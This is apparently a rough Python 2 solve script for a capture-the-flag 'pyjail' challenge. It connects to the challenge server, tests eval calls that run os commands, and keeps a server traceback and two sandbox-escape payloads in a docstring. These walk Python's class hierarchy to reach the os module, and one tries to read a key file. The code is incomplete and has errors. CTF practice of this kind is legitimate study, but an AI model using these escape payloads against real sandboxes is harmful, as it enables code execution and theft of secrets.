__author__ = 'HuyNA'

def test_manual(s):
    final_interact(s)

def pyjail():
    '''
    Remote Code Execution As A Service

    fuckpyjails.9447.plumbing:9447
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "fuckpyjails.9447.plumbing"
    local_host="192.168.248.172"
    port = 9447
    s.connect((host, port))


    eval('"aaaaa"')
    print eval('type(dir([]))')
    aa = 1

    eval("__import__('os').getcwd()")
    if aa is eval("__import__('os').system('echo hello')"):
        print 'T'
    else:
        print 'F'

    test_manual(s)

#exploit_flag02(s)
#pyjail()


'''
Traceback (most recent call last):
  File "/home/ctf/fuckpyjails.py", line 18, in <module>
    if get_key() is eval(raw_input()):
  File "<string>", line 1
    print
        ^
SyntaxError: unexpected EOF while parsing

{}[str(().__class__.__bases__[0].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['os'].__dict__['uname']())]

{}[str(().__class__.__bases__[0].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['os'].__dict__['cat /keyserver']())]
'''